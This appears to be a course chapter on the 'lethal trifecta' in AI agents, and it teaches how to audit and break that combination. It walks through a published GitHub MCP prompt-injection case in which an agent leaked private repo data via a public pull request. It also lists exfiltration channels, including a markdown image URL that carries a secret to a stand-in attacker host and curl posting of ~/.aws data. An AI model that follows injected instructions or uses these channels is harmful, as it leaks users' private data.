# 02: The lethal trifecta

## The idea
Simon Willison's **lethal trifecta** is the combination of three capabilities in one agent ([Willison, June 2025](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)):

1. **Access to your private data**: any tool that can read something an attacker should not see.
2. **Exposure to untrusted content**: any way attacker-controlled text or images can reach the model.
3. **The ability to communicate externally**: any way data can leave to somewhere the attacker can read it.

With all three present, an attacker can put instructions in the untrusted content that tell the model to read the private data and send it out. Prompt injection is unsolved ([01](01-prompt-injection.md)), so you have to assume the model will sometimes comply. The trifecta tells you *when* compliance becomes a data breach.

The useful part is the converse. **Remove any one leg and the exfiltration attack has no path.** Without untrusted input, there is nobody to give the bad instruction. Without private data, there is nothing worth stealing. Without an outbound channel, the data stays put. You do not need to win against the model. You need to break the triangle.

Two properties make this an engineering tool rather than a slogan:

- **It is a property of the union of tools in one context**, not of any single tool. Willison points out that MCP "encourages users to mix and match tools from different sources", so users assemble the trifecta themselves, and no vendor can protect them from it.
- **One tool can be all three legs.** `bash` with network access reads `~/.aws`, reads whatever `curl` fetches, and can `curl -d` the result anywhere.

## Why it matters
The GitHub MCP exploit Invariant Labs published in May 2025 is a clean case ([Invariant Labs](https://invariantlabs.ai/blog/mcp-github-vulnerability)). A user connected the official GitHub MCP server to their client and had both public and private repos. An attacker filed an issue on the public repo containing an injection. When the user asked the agent to look at open issues, the agent:

| Step | Leg |
|---|---|
| Read the public issue | untrusted content |
| Read data from the user's private repos, as the issue told it to | private data |
| Opened a PR on the *public* repo containing that data | exfiltration (a public PR is world-readable) |

Nothing was "hacked" in the classic sense. Every tool did what it was supposed to do. Invariant's point is that GitHub could not fix this server-side, because the problem was the combination of capabilities. Their mitigation was least privilege: restrict the session to one repository. In trifecta terms, that removes the private-data leg for this flow.

Notice what the outbound channel was: a pull request. Most people think of exfiltration as "HTTP to evil.com". In practice the channels include:

- HTTP requests, including GETs with data in the query string
- Rendered markdown images: `![x](https://attacker.example/p.png?d=SECRET)` fetches the URL when a UI renders it
- Links the user clicks
- Public writes: PRs, issue comments, Slack messages in shared channels, commits to public repos
- DNS lookups, if the sandbox can resolve arbitrary names
- Anything else that writes where the attacker can read: a shared bucket, a public gist, a support ticket

## How it works: the audit
Run this for every agent, and again whenever its tool set changes (a new MCP server, a new skill, a broader token).

1. **List every tool in the context**, across all servers, including built-ins like `bash`, `web_fetch` and file reads.
2. **Label each tool with the legs it provides.** Ask three questions:
   - *Private:* can it read anything I would not post publicly?
   - *Untrusted:* can anyone outside my trust boundary influence what it returns?
   - *Exfil:* can it cause bytes to arrive somewhere someone outside my trust boundary can read?
3. **Take the union.** If all three legs have at least one provider, you have the trifecta.
4. **Pick the leg to cut.** Usually it is the one with the fewest providers. For coding and ops agents it is often the outbound leg (*course synthesis*; see the table below).
5. **Cut it structurally**, with a control that holds when the model is compromised: an egress proxy, removing the tool, a scoped token, a human approval on the write, a quarantined reader. A sentence in the prompt does not count.
6. **Record the residual risk**: which legs remain and why that is acceptable.

The course's [`trifecta_audit.py`](code/trifecta_audit.py) automates steps 3–5 over a JSON manifest. It only accepts mitigations from a fixed list of structural controls, and it fails closed: an unlabeled tool is treated as all three legs.

### Cutting each leg

| Leg | Structural ways to cut it | Cost |
|---|---|---|
| Untrusted | Only read content from trusted authors (org members); Dual LLM / quarantined reader; Plan-Then-Execute | Often kills the use case (triaging public issues *is* reading untrusted content) |
| Private | Scoped tokens (one repo, one namespace); credential proxy so secrets never enter the sandbox; separate agent per data domain | Moderate: needs token plumbing |
| Exfil | Default-deny egress proxy; no public-write tools, or writes queued for human approval; no markdown image rendering; no arbitrary DNS | Usually cheapest for coding agents, because the agent's legitimate outbound needs are small and known |

> **Synthesis:** for coding and ops agents, you almost never get to cut "untrusted": the job is reading issues, logs and web pages. So in practice you cut *exfil* and shrink *private*. Treat any remaining public-write tool (PR, comment, chat message) as an exfil channel that needs either an approval step or a content check.

## Worked example
You are auditing an issue-triage agent. Here is the naive manifest, `data/manifests/coding_agent.json`, abbreviated:

```json
{"agent": "issue-triage-coding-agent (naive)",
 "servers": [
  {"name": "github-mcp", "tools": [
    {"name": "get_issue", "legs": ["untrusted"], "note": "anyone can file an issue on a public repo"},
    {"name": "get_file_contents", "legs": ["private"], "note": "token can read private repos too"},
    {"name": "create_pull_request", "legs": ["exfil"], "note": "a PR on a public repo is world-readable"},
    {"name": "add_issue_comment", "legs": ["exfil"]}]},
  {"name": "local", "tools": [
    {"name": "bash", "legs": ["private", "untrusted", "exfil"],
     "note": "reads env and ~/.aws, runs curl, reads whatever curl returns"},
    {"name": "edit_file", "legs": []}]}]}
```

```text
$ python trifecta_audit.py data/manifests/coding_agent.json
agent: issue-triage-coding-agent (naive)
  private   github-mcp.get_file_contents, local.bash
  untrusted github-mcp.get_issue, local.bash
  exfil     github-mcp.create_pull_request, github-mcp.add_issue_comment, local.bash
VERDICT: LETHAL TRIFECTA PRESENT
  single-tool trifecta: local.bash
  cheapest leg to cut: untrusted (2 tool(s))
exit=1
```

The tool suggests "untrusted" because it has the fewest providers, but you can't cut it: triage means reading issues. So you go after exfil and private instead:

- `bash` runs in a sandbox whose only route out is an egress proxy (capability allowlist: PyPI reads, one repo). Secrets are held by a credential proxy, so `env` shows placeholders.
- The GitHub token is scoped to `acme/payments-svc` only.
- `add_issue_comment` is removed. The task doesn't need it.
- `create_pull_request` opens a draft that a human marks ready.

```text
$ python trifecta_audit.py data/manifests/coding_agent_contained.json
agent: issue-triage-coding-agent (contained)
  private   github-mcp.get_file_contents
            (mitigated: sandbox.bash)
  untrusted github-mcp.get_issue, sandbox.bash
  exfil     -
            (mitigated: github-mcp.create_pull_request, sandbox.bash)
VERDICT: no trifecta (missing: exfil)
exit=0
```

The nonzero exit on the naive manifest is deliberate. Put the audit in CI next to your agent config, so adding an MCP server that re-forms the triangle fails the build.

Two honest caveats about that "no trifecta" verdict:

1. **`human_approval` on the PR is only as good as the human.** Anthropic found users approve 93% of permission prompts ([auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode)). If the reviewer rubber-stamps PR descriptions, the PR is still an exfil channel. Pair the approval with an automated canary or secret scan on PR bodies.
2. **The egress allowlist still permits *some* outbound traffic.** Whether that is a leg depends on what the allowed endpoints let you write. That is the subject of [03](03-containment-first-design.md).

## Pitfalls
- **Labeling tools in isolation.** A read-only "search" tool with a query parameter sent to a third party is an exfil channel. *Detect it:* for each tool, ask "where do its *inputs* go?", not just "what does it return?".
- **Missing the rendering channel.** If your UI or Slack bot renders model markdown, images in the output are outbound GETs. *Detect it:* grep your transcripts for `![` and links to hosts you don't own.
- **Accepting prompt-level mitigations.** "The system prompt says never send secrets" is not a cut. *Detect it:* `trifecta_audit.py` warns on any mitigation not in its structural list.
- **Auditing once.** The trifecta reappears when someone adds an MCP server on a Friday. *Detect it:* run the audit in CI on the agent's config, and fail the build on exit 1.
- **Forgetting the user's own tools.** In desktop clients, users add servers themselves. *Detect it:* inventory installed servers per seat (see [05](05-agent-supply-chain-and-confused-deputy.md)).

## In your day job
- Write a manifest for each agent you own, label every tool, and run `trifecta_audit.py`. Commit the manifest next to the agent config.
- When you can't cut "untrusted", default to cutting exfil with an egress proxy and removing public-write tools the task doesn't need.
- Treat public writes (PRs, comments, chat posts) as exfiltration channels, and gate them.
- Re-run the audit whenever a tool, token scope or MCP server changes, ideally as a CI check.
